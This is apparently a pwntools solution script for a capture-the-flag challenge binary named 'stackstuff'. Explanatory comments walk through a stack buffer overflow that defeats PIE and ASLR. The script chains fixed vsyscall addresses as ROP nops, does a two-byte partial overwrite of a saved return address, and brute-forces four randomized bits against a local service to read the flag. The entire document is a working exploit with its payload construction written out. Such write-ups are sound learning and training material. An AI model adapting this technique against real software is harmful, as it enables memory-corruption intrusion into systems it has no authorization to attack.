import pwn
import struct

# stackstuff is a 64-bit dynamically linked binary
# NX is on, PIE is on, ASLR is turned on

# This is a partial overwrite exploit that requires us to rop nop down the stack a bit because our input must be an exact size
# To do this we end up using vsyscall gadgets as rop nops, and a 4-bit brute force

targetParent = pwn.process('./stackstuff')
# pwn.gdb.attach(targetParent, gdbscript="set follow-fork-mode child\nb *(check_password_correct + 172)")

############################
#### vsyscalls overview ####
############################

# Remember: a system call is a special routine in the linux kernel, which happen when userspace applications ask to do privleged tasks,
# like read or write to a file, open a socket, etc.
# Invoking a system call is an expensive operation because the processor must interrupt the currently executing task and switch context
# to kernel mode, subsequently jumping again into userspace after the system call handler finishes its work

# vsyscall and vdso are designed to speedup this process for certain system calls
# The concept of a vsyscall is to map into user space a page that contains some variables and the implementation of some system calls
# In other words, vsyscalls increase performace by offloading certain syscalls to the userspace binary
# The base address of the vsyscall page is fixed, and is 0xffffffffff600000
# Thus, glibc knows the addresses of all virtual system call handlers and we can find these addresses in the glibc source code:
    # #define VSYSCALL_ADDR_vgettimeofday   0xffffffffff600000
    # #define VSYSCALL_ADDR_vtime           0xffffffffff600400
    # #define VSYSCALL_ADDR_vgetcpu         0xffffffffff600800

# vsyscall is an obsolete concept and replaced by vDSO, or virtual dynamic shared object
# The main difference is that vDSO maps memory pages into each process in a shared object form, but vsyscall is static in memory

##################
#### Overflow ####
##################

# The binary asks for a password length, and then scans an input of that length into a 9 byte buffer
# However, if the provided length is greater than 0x32, the length value is set to 0x5a
# The binary also checks to makesure the length of the password we give is equal to the password length

# We can do dynamic analysis by doing
# set follow-fork-mode child
# b *(check_password_correct + 172)
# And then interacting with the binary via netcat: nc 127.0.0.1 1514

# After sending input, we can look at the stack:
# tele -l 30 $rsp
# The buffer storing our input starts at rsp + 0x10
# The return address for the current frame is at rsp + 0x58 and holds an address with pie offset 0xfd1
# We want to reach the pie offset 0x108b, which is handle_request determines that the password is good to go

# My first thought was just to do a partial overwrite of the return address with the 0x_08b
# The problem is that we NEED to write 0x5a bytes, otherwise the binary won't accept our input
# We can't do a partial overwrite unless it is the last thing we are writing, otherwise the rest of the overwrite will overwrite the rest of the address
# The solution is to use vsyscalls as rop-nops and partially overwrite a different stack address
# At rsp + 0x68 sits the return address of the previous frame
# 0x68 - 0x10 = 88. 0x58 (90) - 88 = 2
# So we conveniently have the last two bytes of our overwriting the two lsbs of that address

###############################
#### vsyscalls as rop nops ####
###############################

# But how do we get execution to move us from the current return address to the new target address we are overwriting?
# A type of rop-nop would theoretically accomplish this
# but we can't just use a ret instruction because PIE is enabled, and we don't have an infoleak
# This means that we don't know the address of any ret rop gadgets
# This binary includes vsyscall segment (see vmmap). vsyscall addresses are fixed and are no randomized
# We can use a vsyscall gadget to act essentially as a rop nop
# We can't read vsyscall page because it is execute only, but we know (see above) that the syscall for vgetcpu is at 0xffffffffff600800
# We will use that syscall as our rop nop
vsyscall_ret = struct.pack("<Q", 0xffffffffff600800)

# So what we are doing is essentially this:
    # rsp + 0x58: [vsyscall rop nop] <-- return address
    # rsp + 0x60: [vsyscall rop nop]
    # rsp + 0x68: [partial overwrite target]
# Its like a mini rop chain to drive execution to the partial overwrite target

# The one other consideration is that we will be doing a partial overwrite with 2 bytes
# Only the last 1.5 bytes of the address is the pie offset portion
# That means that there is half a byte which is randomized, that we are overwriting
# So, we will have to brute force those 4 bits, the top 4 bits of the second most lsb

i = 0x0
flag = b'failed'

while 1:
    target = pwn.remote("127.0.0.1", 1514)

    # Filler from the start of our input to the return address
    payload = b'a' * 0x48
    payload += vsyscall_ret * 2 # 2 vsyscall rop nops

    payload += b'\x8b' # Our least significant byte of our partial overwrite

    payload += chr(i).encode() # The byte which we will be brute forcing

    target.sendline(b'90') # length of our input is 0x5a (90) bytes

    target.sendline(payload)

    target.recvuntil(b'Length of password: ')

    if target.can_recv():
        flag = target.recvline() # if we got the flag
        break
    else:
        # Didn't get the flag, try next option for top half byte
        print(f"tried {hex(i)}")
        i += 0x10

print(f"flag = {flag}")

    